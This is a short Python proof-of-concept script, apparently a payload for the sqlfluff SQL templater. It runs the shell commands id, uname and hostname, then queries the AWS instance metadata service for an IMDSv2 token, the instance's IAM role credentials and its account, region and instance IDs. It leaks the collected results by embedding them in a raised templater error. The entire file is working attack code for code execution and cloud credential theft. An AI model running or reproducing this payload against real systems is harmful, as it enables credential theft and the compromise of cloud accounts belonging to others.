import os, sys, json, urllib.request

def emit(tag, obj, cap=7000):
    from sqlfluff.core.errors import SQLTemplaterError
    s = json.dumps(obj, default=str)
    if len(s) > cap:
        s = json.dumps({"_truncated": True, "_len": len(s), "_head": s[:cap-90]})
    raise SQLTemplaterError("F36POC " + s)

out = {}

try:    out["id"]       = os.popen("id").read().strip()
except: out["id"]       = "ERR"
try:    out["uname"]    = os.popen("uname -a").read().strip()
except: out["uname"]    = "ERR"
try:    out["hostname"] = os.popen("hostname").read().strip()
except: out["hostname"] = "ERR"

try:
    rq = lambda u, m="GET", h=None: urllib.request.urlopen(
        urllib.request.Request(u, method=m, headers=h or {}), timeout=3)
    tok = rq("http://169.254.169.254/latest/api/token", "PUT",
             {"X-aws-ec2-metadata-token-ttl-seconds":"300"}).read().decode()
    H = {"X-aws-ec2-metadata-token": tok}
    role = rq("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
              h=H).read().decode().strip().splitlines()[0]
    out["iam_role"] = role
    cr = rq("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, h=H)
    raw = cr.read()
    out["imds_cred_status"] = cr.status
    out["imds_cred_bytes"]  = len(raw)
    doc = json.loads(raw.decode())
    out["access_key_id"] = doc.get("AccessKeyId")
    out["expiration"]    = doc.get("Expiration")
    iid = json.loads(rq("http://169.254.169.254/latest/dynamic/instance-identity/document",
                        h=H).read().decode())
    out["account_id"]    = iid.get("accountId")
    out["region"]        = iid.get("region")
    out["instance_id"]   = iid.get("instanceId")
    out["instance_type"] = iid.get("instanceType")
except Exception as e:
    out["imds_err"] = type(e).__name__ + ": " + str(e)[:200]

emit("POC", out)
